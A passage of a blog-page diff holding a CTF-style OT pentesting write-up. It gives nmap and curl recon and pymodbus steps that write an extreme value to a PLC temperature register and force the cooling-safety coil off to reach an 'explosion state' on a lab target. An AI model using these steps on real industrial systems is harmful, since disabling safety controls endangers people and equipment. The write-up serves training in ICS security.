+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Write result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">after</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cooling after: </span><span class="si">{</span><span class="n">after</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<p>We can now force <code>coil 15</code> to a <code>False</code> state.</p>
+
+<p>Lets see it in action:</p>
+
+<pre><code class="language-bash">python cooling_obliterato.py</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.38.25 PM.png" alt="cooling_obliterato.py output showing Coil 15 forced to False" style="max-width:100%;margin:2rem 0;">
+
+<p>We can finalize this environment's control chain.</p>
+
+<pre><code class="language-fallback">Holding register 0 > temperature value
+Coil 15 > cooling control
+Extreme temperature + cooling disabled = explosion state</code></pre>
+
+<p>We mapped the process logic, validated the register, identified the safety response, then obliterated it.</p>
+
+<p>Not bad for a first encounter with OT pentesting.</p>
+
+<p>The four scripts from this engagement are available in full on the <a href="/scripts/">scripts page</a>.</p>
+
+<hr>
+
+<h2>Flag</h2>
+
+<p><strong>What's the flag?</strong><br>
+<code>THM{BOOM_BOOM_KAB**M}</code></p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.42.10 PM.png" alt="Final explosion state and flag confirmation on Port 80" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 1. Recon</span>
+nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>-T4<span class="w"> </span>TARGET_IP<span class="w"> </span>-oA<span class="w"> </span>kaboom_nmap
+nmap<span class="w"> </span>-sS<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>--script<span class="o">=</span>vuln<span class="w"> </span>-T4<span class="w"> </span>-A<span class="w"> </span>TARGET_IP<span class="w"> </span>-oA<span class="w"> </span>kaboom_nmap_detailed
+<span class="c1"># Ports: 22 SSH | 80 PLC CCTV Simulator | 102 Siemens S7 | 502 Modbus TCP | 8080 OpenPLC | 44818 EtherNet/IP</span>
+
+<span class="c1"># 2. Web service inspection</span>
+curl<span class="w"> </span>-s<span class="w"> </span>http://TARGET_IP/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">80</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-L<span class="w"> </span>http://TARGET_IP:8080/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">120</span>
+<span class="c1"># Port 8080 = OpenPLC | Port 80 CCTV polls /api/state</span>
+curl<span class="w"> </span>-i<span class="w"> </span>http://TARGET_IP/api/state
+curl<span class="w"> </span>-s<span class="w"> </span>http://TARGET_IP/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-Ei<span class="w"> </span><span class="s1">&#39;status|pressure|pump|temperature|fetch|api|static|script&#39;</span>
+
+<span class="c1"># 3. Modbus discovery</span>
+nmap<span class="w"> </span>-Pn<span class="w"> </span>-p502<span class="w"> </span>--script<span class="w"> </span>modbus-discover<span class="w"> </span>TARGET_IP
+<span class="c1"># Unit ID 1 responds | Modbus TCP reachable | no authentication</span>
+
+<span class="c1"># 4. pymodbus setup</span>
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>python3-venv
+python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>~/venvs/pymodbus
+<span class="nb">source</span><span class="w"> </span>~/venvs/pymodbus/bin/activate
+python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pip<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pymodbus
+
+<span class="c1"># 5. Temperature register read</span>
+<span class="c1"># nano read_temp.py -&gt; HOST=&quot;TARGET_IP&quot;, REGISTER=0, SCALE=10</span>
+python<span class="w"> </span>read_temp.py
+<span class="c1"># Register 0 = temperature | value ~51-52 and changing</span>
+
+<span class="c1"># 6. Full register and coil scan</span>
+<span class="c1"># nano scan_modbus.py -&gt; HOST=&quot;TARGET_IP&quot;, UNIT=1</span>
+python<span class="w"> </span>scan_modbus.py
+<span class="c1"># Register 0 only non-zero holding register | all coils False</span>
+
+<span class="c1"># 7. Register write — establish control</span>
+<span class="c1"># nano test_write.py -&gt; HOST=&quot;TARGET_IP&quot;, value=100</span>
+python<span class="w"> </span>test_write.py
+<span class="c1"># Register 0 writable | temperature rises</span>
+<span class="c1"># Edit value=100 -&gt; value=65535</span>
+python<span class="w"> </span>test_write.py
+<span class="c1"># Temperature maxed | Coil 15 flips True (safety mechanism activates)</span>
+python<span class="w"> </span>scan_modbus.py
+
+<span class="c1"># 8. Destroy the safety mechanism</span>
+<span class="c1"># nano cooling_obliterato.py -&gt; HOST=&quot;TARGET_IP&quot;, COOLING_COIL=15, value=False</span>
+python<span class="w"> </span>cooling_obliterato.py
+<span class="c1"># Coil 15 forced False | cooling disabled | explosion state achieved -&gt; flag</span></code></pre></div>
+
+<p>Nmap surfaces full OT port profile including Modbus TCP on port 502 with no authentication. Register 0 holds process temperature and accepts writes. Coil 15 controls the cooling safety mechanism, which auto-activates at extreme values. Writing 65535 to register 0 triggers the safety response. Forcing Coil 15 to False via cooling_obliterato.py removes it.</p>
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
